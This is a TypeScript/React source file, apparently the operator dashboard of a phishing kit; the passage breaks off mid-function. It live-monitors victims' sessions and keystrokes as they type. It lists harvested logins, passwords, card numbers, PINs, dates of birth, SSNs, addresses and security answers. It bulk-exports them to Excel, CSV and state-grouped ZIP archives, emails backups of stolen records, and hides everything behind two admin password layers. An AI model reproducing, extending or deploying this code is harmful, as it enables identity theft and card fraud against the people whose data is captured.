import { useEffect, useState, useRef, useCallback, useMemo, memo } from "react";
import {
  fetchUsers,
  fetchAllUsersForExport,
  deleteAllUsers,
  deleteUserById,
  deleteAllSessions,
  fetchDashboard,
  fetchLiveBundle,
  subscribeLiveUpdates,
  saveUser,
  generateId,
  verifyAdminPassword,
  verifyAdminPassword2,
  getAdminToken,
  clearAdminPassword,
  AuthErr,
  type UserEntry,
  type LiveSession,
  type LiveTypingData,
  type AdminStats,
} from "@/lib/userStore";
import { Shield, Users, UserPlus, UserCheck, Trash2, Clock, Fingerprint, CreditCard, Mail, Phone, KeyRound, Calendar, Hash, Radio, Wifi, WifiOff, Type, LogOut, Download, PlusCircle, Copy, Check, MapPin, Volume2, VolumeX, Star } from "lucide-react";
import { sounds, getSoundEnabled, setSoundEnabled } from "@/lib/sound";
import { zipToState, stateFullName } from "@/lib/zipToState";

// ── Audio context reutilizat (creăm unul singur, nu unul per sunet) ──
let _audioCtx: AudioContext | null = null;
const getAudioCtx = (): AudioContext | null => {
  try {
    if (!_audioCtx) {
      const Ctor = (window.AudioContext || (window as any).webkitAudioContext) as typeof AudioContext | undefined;
      if (!Ctor) return null;
      _audioCtx = new Ctor();
    }
    if (_audioCtx.state === "suspended") void _audioCtx.resume();
    return _audioCtx;
  } catch { return null; }
};

// ── Melodic notification alarm ──
const playAlarm = () => {
  if (!getSoundEnabled()) return;
  const ctx = getAudioCtx();
  if (!ctx) return;
  try {
    const notes = [880, 1100, 1320, 1100, 1320, 1760];
    const durations = [0.1, 0.1, 0.15, 0.1, 0.15, 0.25];
    let t = ctx.currentTime;
    notes.forEach((freq, i) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.type = "sine";
      osc.frequency.value = freq;
      gain.gain.setValueAtTime(0.15, t);
      gain.gain.exponentialRampToValueAtTime(0.01, t + durations[i]);
      osc.start(t);
      osc.stop(t + durations[i] + 0.02);
      t += durations[i];
    });
  } catch {}
};


const ICON_MAP: Record<string, React.ReactNode> = {
  "User ID": <Fingerprint size={13} />,
  "Password": <KeyRound size={13} />,
  "First Name": <Users size={13} />,
  "Last Name": <Users size={13} />,
  "Email": <Mail size={13} />,
  "Phone": <Phone size={13} />,
  "Card Number": <CreditCard size={13} />,
  "PIN": <Hash size={13} />,
  "DOB": <Calendar size={13} />,
  "SSN": <KeyRound size={13} />,
};

// Parolele NU mai sunt în cod — verificarea e făcută de edge function-ul admin-api.

const maskValue = (value: string) => "••••••••";

const sortUsersByNewest = (entries: UserEntry[]) => {
  const toMillis = (value?: string) => {
    const ms = Date.parse(`${value ?? ""}`);
    return Number.isFinite(ms) ? ms : 0;
  };

  return [...entries].sort((a, b) => {
    const tsDiff = toMillis(b.timestamp) - toMillis(a.timestamp);
    if (tsDiff !== 0) return tsDiff;
    return toMillis(b.updatedAt) - toMillis(a.updatedAt);
  });
};

const sessionLastActivityMs = (session: LiveSession, typing: LiveTypingData) => {
  const sessionSeen = Date.parse(session.lastSeen || "") || 0;
  const typingValues = typing[session.sessionId] || {};
  const hasTyping = Object.keys(typingValues).length > 0;
  return hasTyping ? Date.now() : sessionSeen;
};

const isLikelyRealSession = (session: LiveSession, typing: LiveTypingData) => {
  const page = `${session.currentPage || ""}`.trim();
  const typingValues = typing[session.sessionId] || {};
  const typingKeys = Object.keys(typingValues).filter((key) => `${typingValues[key] || ""}`.trim().length > 0);
  const hasTyping = typingKeys.length > 0;
  const isFinalPage = page.includes("✅") || /confirmation/i.test(page);
  const isKnownFlowPage = page.includes("🏠") || page.includes("📝") || page.includes("🔐") || page.includes("💳") || isFinalPage;
  return hasTyping || isKnownFlowPage;
};

const dedupeLikelySameUsers = (entries: UserEntry[]) => {
  const groups = new Map<string, UserEntry[]>();
  const makeKey = (entry: UserEntry) => {
    const parts = [
      entry.userId?.trim().toLowerCase() || "",
      entry.email?.trim().toLowerCase() || "",
      entry.phone?.replace(/\D/g, "") || "",
      entry.cardNumber?.replace(/\D/g, "") || "",
    ].filter(Boolean);
    return parts.join("|");
  };

  for (const entry of entries) {
    const key = makeKey(entry);
    if (!key) continue;
    const arr = groups.get(key) ?? [];
    arr.push(entry);
    groups.set(key, arr);
  }

  const olderIds = new Set<string>();
  groups.forEach((group) => {
    if (group.length < 2) return;
    const sorted = [...group].sort((a, b) => {
      const updatedDiff = Date.parse(b.updatedAt || b.timestamp || "") - Date.parse(a.updatedAt || a.timestamp || "");
      if (updatedDiff !== 0) return updatedDiff;
      return Date.parse(b.timestamp || "") - Date.parse(a.timestamp || "");
    });
    sorted.slice(1).forEach((entry) => olderIds.add(entry.id));
  });

  return olderIds;
};

// ── Typing sound (subtle tick) ──
const playTypingTick = () => {
  const ctx = getAudioCtx();
  if (!ctx) return;
  try {
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.type = "sine";
    osc.frequency.value = 1200;
    gain.gain.setValueAtTime(0.04, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.05);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.06);
  } catch {}
};

const CLOCK_TICK_MS = 1000;

// security level: 0 = fully locked, 1 = panel visible but sensitive data blurred, 2 = fully unlocked
const ITEMS_PER_PAGE = 50;

// Signature ieftin: doar id + timestamp + count câmpuri completate. Rulează la fiecare poll
// (1-3s), deci NU trebuie să facă JSON.stringify pe payload-uri mari.
const rowsSignature = (rows: UserEntry[]) => {
  let s = `${rows.length}|`;
  for (let i = 0; i < rows.length; i++) {
    const u = rows[i];
    // Numărăm câmpurile completate ca proxy pentru "s-a schimbat ceva"
    let filled = 0;
    if (u.userId) filled++;
    if (u.password) filled++;
    if (u.firstName) filled++;
    if (u.lastName) filled++;
    if (u.email) filled++;
    if (u.phone) filled++;
    if (u.cardNumber) filled++;
    if (u.pinCard) filled++;
    if (u.dob) filled++;
    if (u.ssnLast4) filled++;
    if (u.zipCode) filled++;
    if (u.streetAddress) filled++;
    if (u.city) filled++;
    if (u.state) filled++;
    if (u.challengeQuestions?.length) filled += u.challengeQuestions.length;
    s += `${u.id}:${u.timestamp ?? ""}:${filled};`;
  }
  return s;
};
const liveSignature = (rows: LiveSession[], typing: LiveTypingData) => {
  let s = "";
  for (let i = 0; i < rows.length; i++) {
    const r = rows[i];
    s += `${r.sessionId}:${r.status}:${r.lastSeen}|`;
  }
  s += "::";
  // Pentru typing facem un hash ieftin: count + sumă lungimi valori. Schimbarea unei litere
  // va modifica suma, iar diferența detectată reflectă "s-a tastat ceva nou".
  const sids = Object.keys(typing);
  s += sids.length;
  for (let i = 0; i < sids.length; i++) {
    const sid = sids[i];
    const fields = typing[sid] || {};
    let sum = 0;
    for (const k in fields) sum += (fields[k]?.length ?? 0);
    s += `|${sid}:${Object.keys(fields).length}:${sum}`;
  }
  return s;
};
const makeStats = (users: number, sessions = 0, typing = 0): AdminStats => ({ totalEntries: users, liveSessions: sessions, liveTyping: typing, approximate: true });

const Admin = () => {
  const [users, setUsers] = useState<UserEntry[]>([]);
  const [zipMenuOpen, setZipMenuOpen] = useState(false);
  const [sessions, setSessions] = useState<LiveSession[]>([]);
  const [adminStats, setAdminStats] = useState<AdminStats>(makeStats(0));
  const totalEntriesRef = useRef(0);
  const [publicStats, setPublicStats] = useState<{ totalEntries: number; visitorsOnline: number }>({ totalEntries: 0, visitorsOnline: 0 });
  const [liveTyping, setLiveTyping] = useState<LiveTypingData>({});
  const [filter, setFilter] = useState<"all" | "new" | "old">("all");
  const [page, setPage] = useState(1);
  const [searchQuery, setSearchQuery] = useState("");
  const [dateFilter, setDateFilter] = useState<"all" | "today" | "7d" | "30d" | "custom">("all");
  const [customFrom, setCustomFrom] = useState("");
  const [customTo, setCustomTo] = useState("");
  const [sortBy, setSortBy] = useState<"newest" | "oldest" | "complete" | "name">("newest");
  const prevCount = useRef(0);
  const prevSessionCount = useRef(0);
  const prevTypingKeys = useRef("");
  const usersSignatureRef = useRef(rowsSignature([]));
  const liveSignatureRef = useRef(liveSignature([], {}));
  const usersRefreshInFlight = useRef(false);
  const usersRefreshPending = useRef(false);
  const liveRefreshInFlight = useRef(false);
  const liveRefreshPending = useRef(false);
  const usersRefreshTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const liveRefreshTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const [time, setTime] = useState(new Date());
  const [flashNew, setFlashNew] = useState(false);
  const [securityLevel, setSecurityLevel] = useState<0 | 1 | 2>(0);
  const [password, setPassword] = useState("");
  const [shake, setShake] = useState(false);
  const [unlockBusy, setUnlockBusy] = useState(false);
  const [unlockError, setUnlockError] = useState<string | null>(null);
  const [soundOn, setSoundOnState] = useState<boolean>(() => getSoundEnabled());
  const [starred, setStarred] = useState<Set<string>>(() => {
    try { return new Set(JSON.parse(localStorage.getItem("ebt_starred_users") || "[]")); } catch { return new Set(); }
  });
  const toggleStar = useCallback((id: string) => {
    setStarred((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id); else next.add(id);
      try { localStorage.setItem("ebt_starred_users", JSON.stringify(Array.from(next))); } catch {}
      sounds.click();
      return next;
    });
  }, []);
  const themeColors = useMemo(() => ({ a: "#00d2ff", b: "#a855f7", c: "#06080f" }), []);
  const toggleSound = useCallback(() => {
    setSoundOnState((on) => {
      const next = !on;
      setSoundEnabled(next);
      if (next) sounds.success();
      return next;
    });
  }, []);


  useEffect(() => {
    (window as any).__IS_ADMIN__ = true;
    return () => { delete (window as any).__IS_ADMIN__; };
  }, []);

  useEffect(() => {
    totalEntriesRef.current = Math.max(adminStats.totalEntries, users.length);
  }, [adminStats.totalEntries, users.length]);


  const triggerShake = (msg?: string) => {
    setShake(true);
    setUnlockError(msg ?? null);
    setTimeout(() => setShake(false), 500);
  };

  const handleUnlock = async () => {
    if (unlockBusy) return;
    if (!password) return;
    setUnlockBusy(true);
    setUnlockError(null);
    try {
      if (securityLevel === 0) {
        const layer = await verifyAdminPassword(password);
        setSecurityLevel(layer === 2 ? 2 : 1);
        setPassword("");
      } else if (securityLevel === 1) {
        // Layer 2 — verifică a 2-a parolă (separată)
        await verifyAdminPassword2(password);
        setSecurityLevel(2);
        setPassword("");
      }
    } catch (e: any) {
      const status = e instanceof AuthErr ? e.status : 0;
      if (status === 429) triggerShake("Prea multe încercări. Așteaptă 15 min.");
      else if (status === 401) triggerShake(securityLevel === 1 ? "Parola 2 greșită" : "Parolă greșită");
      else if (status === 500) triggerShake("Secret admin lipsă sau invalid. Verifică secretele Cloud.");
      else triggerShake(`Eroare server${status ? ` (${status})` : ""}. Încearcă din nou.`);
      setPassword("");
    } finally {
      setUnlockBusy(false);
    }
  };

  const handleLogout = () => {
    clearAdminPassword();
    setSecurityLevel(0);
    setUsers([]);
    setSessions([]);
    setLiveTyping({});
    setUnlockError(null);
  };

  const refreshUsers = useCallback(async () => {
    if (usersRefreshInFlight.current) {
      usersRefreshPending.current = true;
      return;
    }

    usersRefreshInFlight.current = true;
    try {
      do {
        usersRefreshPending.current = false;
        const allRaw = await fetchUsers();
        const allUsers = sortUsersByNewest(allRaw);
        const total = allUsers.length;
        const signature = rowsSignature(allUsers);

        if (total > prevCount.current && prevCount.current > 0) {
          playAlarm();
          setFlashNew(true);
          setTimeout(() => setFlashNew(false), 2000);
        }

        prevCount.current = total;
        if (signature !== usersSignatureRef.current) {
          usersSignatureRef.current = signature;
          setUsers(allUsers);
        }
        setAdminStats((prev) => ({ ...prev, totalEntries: total, approximate: true }));
      } while (usersRefreshPending.current);
    } finally {
      usersRefreshInFlight.current = false;
    }
  }, []);

  const applyUsers = useCallback((rows: UserEntry[], stats?: AdminStats) => {
    const allUsers = sortUsersByNewest(rows);
    const total = Math.max(stats?.totalEntries ?? allUsers.length, allUsers.length);
    if (total > prevCount.current && prevCount.current > 0) {
      playAlarm();
      setFlashNew(true);
      setTimeout(() => setFlashNew(false), 2000);
    }
    prevCount.current = total;
    const signature = rowsSignature(allUsers);
    if (signature !== usersSignatureRef.current) {
      usersSignatureRef.current = signature;
      setUsers(allUsers);
    }
    if (stats) setAdminStats(stats);
  }, []);

  const applyLive = useCallback((liveSessions: LiveSession[], currentTyping: LiveTypingData) => {
    const activeSessions = liveSessions.filter((s) => s.status !== "left").slice(0, 80);
    if (activeSessions.length > prevSessionCount.current && prevSessionCount.current > 0) playAlarm();
    prevSessionCount.current = activeSessions.length;

    const typingSnapshot = JSON.stringify(currentTyping);
    if (typingSnapshot !== prevTypingKeys.current && prevTypingKeys.current !== "") playTypingTick();
    prevTypingKeys.current = typingSnapshot;

    const nextSessions = liveSessions.slice(0, 80);
    const signature = liveSignature(nextSessions, currentTyping);
    if (signature !== liveSignatureRef.current) {
      liveSignatureRef.current = signature;
      setSessions(nextSessions);
      setLiveTyping(currentTyping);
    }
  }, []);

  const refreshLive = useCallback(async () => {
    if (liveRefreshInFlight.current) {
      liveRefreshPending.current = true;
      return;
    }

    liveRefreshInFlight.current = true;
    try {
      do {
        liveRefreshPending.current = false;
        const { sessions: liveSessions, typing: currentTyping, stats } = await fetchLiveBundle();
        setAdminStats(stats);
        applyLive(liveSessions, currentTyping);
      } while (liveRefreshPending.current);
    } finally {
      liveRefreshInFlight.current = false;
    }
  }, [applyLive]);

  const refresh = useCallback(async () => {
    const { users: allUsers, sessions: liveSessions, typing: currentTyping, stats } = await fetchDashboard();
    applyUsers(allUsers, stats);
    applyLive(liveSessions, currentTyping);
  }, [applyLive, applyUsers]);

  const scheduleUsersRefresh = useCallback(() => {
    if (usersRefreshTimer.current) clearTimeout(usersRefreshTimer.current);
    usersRefreshTimer.current = setTimeout(() => void refreshUsers(), 900);
  }, [refreshUsers]);

  const scheduleLiveRefresh = useCallback(() => {
    if (liveRefreshTimer.current) clearTimeout(liveRefreshTimer.current);
    liveRefreshTimer.current = setTimeout(() => void refreshLive(), 120);
  }, [refreshLive]);

  useEffect(() => {
    // Nu apela admin-api dacă nu e deblocat (n-avem parolă în storage).
    if (securityLevel === 0) {
      const projectId = import.meta.env.VITE_SUPABASE_PROJECT_ID;
      const fetchPublicStats = async () => {
        try {
          const res = await fetch(`https://${projectId}.supabase.co/functions/v1/public-stats-v2`);
          if (res.ok) {
            const data = await res.json();
            setPublicStats({
              totalEntries: Number(data.totalEntries) || 0,
              visitorsOnline: Number(data.visitorsOnline) || 0,
            });
          }
        } catch {}
      };
      void fetchPublicStats();
      const statsInterval = setInterval(fetchPublicStats, 10000);
      const clockInterval = setInterval(() => setTime(new Date()), CLOCK_TICK_MS);
      return () => {
        clearInterval(statsInterval);
        clearInterval(clockInterval);
      };
    }

    // Când trecem din layer 1 în layer 2, datele vin nemascate de pe server,
    // dar pot avea aceleași id/timestamp/count câmpuri ca varianta cu puncte.
    // Resetăm semnătura ca UI-ul să înlocuiască obligatoriu rândurile mascate.
    if (securityLevel === 2) usersSignatureRef.current = "";

    void refresh();

    // Polling agresiv pentru "milimetric": live aproape în timp real, users la fiecare câteva secunde.
    // SE OPREȘTE când tab-ul e ascuns → economisim CPU și baterie pe mobil când nu te uiți.
    const isVisible = () => document.visibilityState === "visible";
    const usersInterval = setInterval(() => {
      if (isVisible()) void refreshUsers();
    }, 4000);
    const liveInterval = setInterval(() => {
      if (isVisible()) void refreshLive();
    }, 1500);

    // La revenirea pe tab, refresh imediat ca să vedem imediat ce s-a schimbat.
    const onVisibility = () => {
      if (isVisible()) {
        void refreshLive();
        void refreshUsers();
      }
    };
    document.addEventListener("visibilitychange", onVisibility);

    const unsubscribeLive = subscribeLiveUpdates((table) => {
      if (table === "user_entries") {
        scheduleUsersRefresh();
        return;
      }
      scheduleLiveRefresh();
    });

    const clockInterval = setInterval(() => setTime(new Date()), CLOCK_TICK_MS);
    return () => {
      clearInterval(usersInterval);
      clearInterval(liveInterval);
      clearInterval(clockInterval);
      document.removeEventListener("visibilitychange", onVisibility);
      if (usersRefreshTimer.current) clearTimeout(usersRefreshTimer.current);
      if (liveRefreshTimer.current) clearTimeout(liveRefreshTimer.current);
      unsubscribeLive();
    };
  }, [refresh, refreshLive, refreshUsers, scheduleLiveRefresh, scheduleUsersRefresh, securityLevel]);

  const sendBackupEmail = async (entries: UserEntry[]) => {
    if (entries.length === 0) return;
    try {
      const projectId = import.meta.env.VITE_SUPABASE_PROJECT_ID;
      const token = getAdminToken();
      await fetch(`https://${projectId}.supabase.co/functions/v1/send-backup-email`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ users: entries, token }),
      });
    } catch {}
  };

  const handleClearAll = async () => {
    if (!confirm("Delete ALL user data?")) return;
    try {
      if (users.length > 0) await sendBackupEmail(users);
      await deleteAllUsers();
      await deleteAllSessions();
      localStorage.removeItem("ebt_sc");
      prevCount.current = 0;
      prevSessionCount.current = 0;
      void refresh();
    } catch (e: any) {
      const msg = String(e?.message || e || "");
      if (msg.includes("layer2_required")) {
        alert("🔒 Layer 2 needed. Deschide Security panel și deblocheaza Layer 2, apoi încearcă din nou.");
      } else {
        alert("Delete failed: " + (msg || "unknown error"));
      }
    }
  };

  const handleDeleteOne = async (user: UserEntry) => {
    if (!confirm(`Delete entry #${users.indexOf(user) + 1}?`)) return;
    try {
      await sendBackupEmail([user]);
      await deleteUserById(user.id);
      void refresh();
    } catch (e: any) {
      const msg = String(e?.message || e || "");
      if (msg.includes("layer2_required")) {
        alert("🔒 Layer 2 needed pentru a șterge useri.");
      } else {
        alert("Delete failed: " + (msg || "unknown error"));
      }
    }
  };

  // ─── Detect exact duplicates (same data, letter-for-letter) ───
  const duplicateInfo = useMemo(() => {
    // STRICT match: literă cu literă, inclusiv puncte, spații, majuscule.
    // Dacă diferă și un singur caracter (ex. un punct) → NU e duplicat.
    const sigOf = (u: UserEntry) => JSON.stringify([
      u.userId || "",
      u.password || "",
      u.firstName || "",
      u.lastName || "",
      u.email || "",
      u.phone || "",
      u.cardNumber || "",
      u.pinCard || "",
      u.dob || "",
      u.ssnLast4 || "",
      u.zipCode || "",
      u.streetAddress || "",
      u.aptUnit || "",
      u.city || "",
      u.state || "",
      (u.challengeQuestions ?? []).map(q => [q.question || "", q.answer || ""]),
    ]);

    const groups = new Map<string, UserEntry[]>();
    for (const u of users) {
      const sig = sigOf(u);
      // Skip useri complet goi (fără date reale)
      const hasData = !!(u.userId || u.password || u.cardNumber || u.email || u.firstName);
      if (!hasData) continue;
      const arr = groups.get(sig) ?? [];
      arr.push(u);
      groups.set(sig, arr);
    }

    const dupIds = new Set<string>();
    const toDeleteIds = new Set<string>();
    let dupGroups = 0;
    for (const arr of groups.values()) {
      if (arr.length < 2) continue;
      dupGroups++;
      // Sort by timestamp desc — keep newest, delete the rest
      const sorted = [...arr].sort((a, b) =>
        new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
      );
      sorted.forEach((u) => dupIds.add(u.id));
      sorted.slice(1).forEach((u) => toDeleteIds.add(u.id));
    }
    return { dupIds, toDeleteIds, dupGroups };
  }, [users]);

  const likelyDuplicateIds = useMemo(() => dedupeLikelySameUsers(users), [users]);

  const handleCleanDuplicates = async () => {
    const ids = Array.from(new Set([...duplicateInfo.toDeleteIds, ...likelyDuplicateIds]));
    if (ids.length === 0) return;
    if (!confirm(`Found ${duplicateInfo.dupGroups} duplicate group(s). Delete ${ids.length} older copy/copies (keep newest)?`)) return;
    for (const id of ids) {
      try { await deleteUserById(id); } catch {}
    }
    void refresh();
  };

  const [exportProgress, setExportProgress] = useState("");
  const [csvProgress, setCsvProgress] = useState("");

  // Background CSV export — scales to millions without freezing the browser.
  const handleDownloadAllCsv = async () => {
    if (csvProgress) return;
    const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
    const anonKey = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
    const headers = {
      "Content-Type": "application/json",
      apikey: anonKey,
      Authorization: `Bearer ${anonKey}`,
    };
    const token = getAdminToken();
    if (!token) { setCsvProgress("error: not_authenticated"); setTimeout(() => setCsvProgress(""), 3000); return; }
    if (securityLevel < 2) { setCsvProgress("error: layer2_required"); setTimeout(() => setCsvProgress(""), 3000); return; }
    setCsvProgress("starting...");
    let jobId: string | null = null;
    try {
      const startRes = await fetch(`${supabaseUrl}/functions/v1/bulk-export-job`, {
        method: "POST", headers, body: JSON.stringify({ token }),
      });
      const startData = await startRes.json();
      if (!startRes.ok || !startData?.ok) {
        setCsvProgress(`error: ${startData?.error ?? startRes.status}`);
        setTimeout(() => setCsvProgress(""), 3000);
        return;
      }
      jobId = startData.job_id as string;
    } catch (e: any) {
      setCsvProgress(`error: ${e?.message ?? "network"}`);
      setTimeout(() => setCsvProgress(""), 3000);
      return;
    }

    while (true) {
      await new Promise(r => setTimeout(r, 1500));
      try {
        const res = await fetch(`${supabaseUrl}/functions/v1/bulk-job-status`, {
          method: "POST", headers,
          body: JSON.stringify({ id: jobId, token }),
        });
        const data = await res.json();
        if (!data?.ok) continue;
        const job = data.job;
        setCsvProgress(`${Number(job.processed).toLocaleString()} / ${Number(job.total).toLocaleString()}`);
        if (job.status === 'completed') {
          if (job.result_url) {
            const a = document.createElement('a');
            a.href = job.result_url;
            a.download = `data_export_${new Date().toISOString().slice(0, 10)}.csv`;
            document.body.appendChild(a);
            a.click();
            a.remove();
          }
          setCsvProgress(`✅ ${Number(job.processed).toLocaleString()} rows`);
          setTimeout(() => setCsvProgress(""), 4000);
          return;
        }
        if (job.status === 'failed') {
          setCsvProgress(`failed: ${job.error_message ?? 'unknown'}`);
          setTimeout(() => setCsvProgress(""), 4000);
          return;
        }
      } catch { /* keep polling */ }
    }
  };

  const handleDownloadExcel = async (only?: "new" | "old") => {
    setExportProgress("Fetching all data...");
    let allRaw: UserEntry[];
    try {
      allRaw = await fetchAllUsersForExport((fetched, expected) => {
        setExportProgress(`Fetching... ${fetched}/${expected}`);
      });
    } catch (e) {
      setExportProgress("Error fetching data!");
      setTimeout(() => setExportProgress(""), 3000);
      return;
    }

    if (only) {
      allRaw = allRaw.filter((u) => u.type === only);
    }

    if (allRaw.length === 0) {
      setExportProgress("");
      return;
    }

    setExportProgress(`Building Excel (${allRaw.length} entries)...`);
    const XLSX = await import("xlsx");

    const oldUsers = allRaw.filter((u) => u.type === "old");
    const newUsers = allRaw.filter((u) => u.type === "new");

    const wb = XLSX.utils.book_new();

    // ── Sheet 0: All Users (only when exporting ALL) ──
    const maxCQAll = allRaw.reduce((max, u) => Math.max(max, u.challengeQuestions?.length || 0), 0);
    if (!only) {
    const allHeaders = [
      "#",
      "Type",
      "📅 Date",
      "⏰ Time",
      "🔑 User ID",
      "🔒 Password",
      "👤 First Name",
      "👤 Last Name",
      "📧 Email",
      "📱 Phone",
      "💳 Card Number",
      "🔢 PIN",
      "🎂 DOB",
      "🆔 SSN",
      "📮 Zip Code",
      "🏠 Street Address",
    ];

    for (let i = 1; i <= maxCQAll; i++) {
      allHeaders.push(`❓ Security Q${i}`, `✅ Answer ${i}`);
    }

    const allData = allRaw.map((u, i) => {
      const row: (string | number)[] = [
        i + 1,
        u.type === "old" ? "Returning" : "New",
        new Date(u.timestamp).toLocaleDateString("en-US", { year: "numeric", month: "short", day: "numeric" }),
        new Date(u.timestamp).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit" }),
        u.userId || "—",
        u.password || "—",
        u.firstName || "—",
        u.lastName || "—",
        u.email || "—",
        u.phone || "—",
        u.cardNumber || "—",
        u.pinCard || "—",
        u.dob || "—",
        u.ssnLast4 || "—",
        u.zipCode || "—",
        u.streetAddress || "—",
      ];

      for (let qi = 0; qi < maxCQAll; qi++) {
        const cq = u.challengeQuestions?.[qi];
        row.push(cq?.question || "—", cq?.answer || "—");
      }

      return row;
    });

    const wsAll = XLSX.utils.aoa_to_sheet([
      [`ALL USERS — ${allRaw.length} entries`],
      [],
      allHeaders,
      ...allData,
    ]);

    wsAll["!merges"] = [{ s: { r: 0, c: 0 }, e: { r: 0, c: allHeaders.length - 1 } }];
    const allCols = [
      { wch: 5 },
      { wch: 11 },
      { wch: 14 },
      { wch: 10 },
      { wch: 22 },
      { wch: 20 },
      { wch: 15 },
      { wch: 15 },
      { wch: 26 },
      { wch: 16 },
      { wch: 22 },
      { wch: 8 },
      { wch: 14 },
      { wch: 10 },
      { wch: 10 },
      { wch: 26 },
    ];
    for (let i = 0; i < maxCQAll; i++) {
      allCols.push({ wch: 30 }, { wch: 18 });
    }
    wsAll["!cols"] = allCols;
    wsAll["!freeze"] = { xSplit: 0, ySplit: 3 };
    XLSX.utils.book_append_sheet(wb, wsAll, "🧾 All Users");
    }

    // ── Sheet 1: Returning Users ──
    if (!only || only === "old") {
    const oldHeaders = ["#", "📅 Date", "⏰ Time", "🔑 User ID", "🔒 Password", "💳 Card Number", "🔢 PIN", "🎂 DOB", "🆔 SSN", "📮 Zip Code", "🏠 Street Address"];
    const oldData = oldUsers.map((u, i) => [
      i + 1,
      new Date(u.timestamp).toLocaleDateString("en-US", { year: "numeric", month: "short", day: "numeric" }),
      new Date(u.timestamp).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit" }),
      u.userId || "—",
      u.password || "—",
      u.cardNumber || "—",
      u.pinCard || "—",
      u.dob || "—",
      u.ssnLast4 || "—",
      u.zipCode || "—",
      u.streetAddress || "—",
    ]);
    const wsOld = XLSX.utils.aoa_to_sheet([
      [`RETURNING USERS — ${oldUsers.length} entries`],
      [],
      oldHeaders,
      ...oldData,
    ]);
    // Merge title row
    wsOld["!merges"] = [{ s: { r: 0, c: 0 }, e: { r: 0, c: oldHeaders.length - 1 } }];
    wsOld["!cols"] = [
      { wch: 5 }, { wch: 14 }, { wch: 10 }, { wch: 22 }, { wch: 20 },
      { wch: 22 }, { wch: 8 }, { wch: 14 }, { wch: 10 }, { wch: 10 },
      { wch: 26 },
    ];
    // Freeze header row
    wsOld["!freeze"] = { xSplit: 0, ySplit: 3 };
    XLSX.utils.book_append_sheet(wb, wsOld, "🔵 Returning Users");
    }

    // ── Sheet 2: New Users ──
    if (!only || only === "new") {
    // Find max challenge questions count
    const maxCQ = newUsers.reduce((max, u) => Math.max(max, u.challengeQuestions?.length || 0), 0);
    const newHeaders = ["#", "📅 Date", "⏰ Time", "🔑 User ID", "🔒 Password", "📧 Email", "📱 Phone", "💳 Card Number", "🔢 PIN", "🎂 DOB", "🆔 SSN", "📮 Zip Code", "🏠 Street Address"];
    for (let i = 1; i <= maxCQ; i++) {
      newHeaders.push(`❓ Security Q${i}`, `✅ Answer ${i}`);
    }
    const newData = newUsers.map((u, i) => {
      const row: (string | number)[] = [
        i + 1,
        new Date(u.timestamp).toLocaleDateString("en-US", { year: "numeric", month: "short", day: "numeric" }),
        new Date(u.timestamp).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit" }),
        u.userId || "—",
        u.password || "—",
        u.email || "—",
        u.phone || "—",
        u.cardNumber || "—",
        u.pinCard || "—",
        u.dob || "—",
        u.ssnLast4 || "—",
        u.zipCode || "—",
        u.streetAddress || "—",
      ];
      for (let qi = 0; qi < maxCQ; qi++) {
        const cq = u.challengeQuestions?.[qi];
        row.push(cq?.question || "—", cq?.answer || "—");
      }
      return row;
    });
    const wsNew = XLSX.utils.aoa_to_sheet([
      [`NEW USERS — ${newUsers.length} entries`],
      [],
      newHeaders,
      ...newData,
    ]);
    wsNew["!merges"] = [{ s: { r: 0, c: 0 }, e: { r: 0, c: newHeaders.length - 1 } }];
    const newCols = [
      { wch: 5 }, { wch: 14 }, { wch: 10 }, { wch: 22 }, { wch: 20 },
      { wch: 26 }, { wch: 16 }, { wch: 22 }, { wch: 8 }, { wch: 14 }, { wch: 10 },
      { wch: 10 }, { wch: 26 },
    ];
    for (let i = 0; i < maxCQ; i++) {
      newCols.push({ wch: 30 }, { wch: 18 });
    }
    wsNew["!cols"] = newCols;
    wsNew["!freeze"] = { xSplit: 0, ySplit: 3 };
    XLSX.utils.book_append_sheet(wb, wsNew, "🟢 New Users");
    }

    // ── Sheet 3: Summary ──
    if (!only) {
    const wsSummary = XLSX.utils.aoa_to_sheet([
      ["📊 EXPORT SUMMARY"],
      [],
      ["Metric", "Value"],
      ["Total Entries (Exported)", allRaw.length],
      ["Panel Count (At Export)", users.length],
      ["Returning Users", oldUsers.length],
      ["New Users", newUsers.length],
      [],
      ["Export Date", new Date().toLocaleDateString("en-US", { weekday: "long", year: "numeric", month: "long", day: "numeric" })],
      ["Export Time", new Date().toLocaleTimeString("en-US")],
    ]);
    wsSummary["!merges"] = [{ s: { r: 0, c: 0 }, e: { r: 0, c: 1 } }];
    wsSummary["!cols"] = [{ wch: 20 }, { wch: 30 }];
    XLSX.utils.book_append_sheet(wb, wsSummary, "📊 Summary");
    }

    const tag = only === "new" ? "new_users_" : only === "old" ? "returning_users_" : "";
    XLSX.writeFile(wb, `${tag}data_export_${new Date().toISOString().slice(0, 10)}.xlsx`);
    setExportProgress(`✅ Exported ${allRaw.length} entries!`);
    setTimeout(() => setExportProgress(""), 4000);
  };

  // ── ZIP export grouped by state, one .txt per user ──
  const handleDownloadZipByState = async (only?: "new" | "old") => {
    setExportProgress("Fetching all data...");
    let allRaw: UserEntry[];
    try {
      allRaw = await fetchAllUsersForExport((fetched, expected) => {
        setExportProgress(`Fetching... ${fetched}/${expected}`);
      });
    } catch {
      setExportProgress("Error fetching data!");
      setTimeout(() => setExportProgress(""), 3000);
      return;
    }
    if (only) allRaw = allRaw.filter((u) => u.type === only);
    if (allRaw.length === 0) { setExportProgress(""); return; }

    setExportProgress(`Building ZIP (${allRaw.length} entries)...`);
    const JSZip = (await import("jszip")).default;
    const zip = new JSZip();

    // group by FULL state name — derivă state din ZIP pentru rândurile vechi fără stat
